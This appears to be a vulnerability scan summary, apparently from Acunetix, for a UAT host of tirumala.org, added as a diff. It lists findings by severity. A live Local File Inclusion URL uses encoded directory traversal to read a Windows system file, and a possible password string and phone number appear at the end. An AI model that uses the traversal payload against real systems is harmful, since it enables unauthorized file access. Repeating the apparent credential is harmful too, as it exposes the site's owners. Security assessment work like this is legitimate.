@@ -1,0 +1,57 @@
+https://tirumala-uat.tirumala.org
+
+
+
+Local File Inclusion					High
+	https://tirumala-uat.tirumala.org/RamanujamKeertanasFileCS.ashx?Id=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5csystem32%5clicense.rtf
+Insufficent anti automation					Medium
+	https://tirumala-uat.tirumala.org/Contactus.aspx
+Unencrypted view state					Medium
+Vulnerable Javascript library				Medium
+Email id disclosure					Low
+	https://tirumala-uat.tirumala.org/Contactus.aspx
+Click Jacking						Low
+Version disclosure						Low
+Security headers missing					Low
+	Cookie(s) without Secure flag set
+	Content Security Policy (CSP) not implemented
+Subresource Integrity (SRI) not implemented			Low
+	https://tirumala-uat.tirumala.org/AlwarPasurams.aspx
+	https://tirumala-uat.tirumala.org/DasaSahithya.aspx
+Debug method enabled					Low
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#Acunetix@139
+
+
+
+
+
+
+
+9966355574
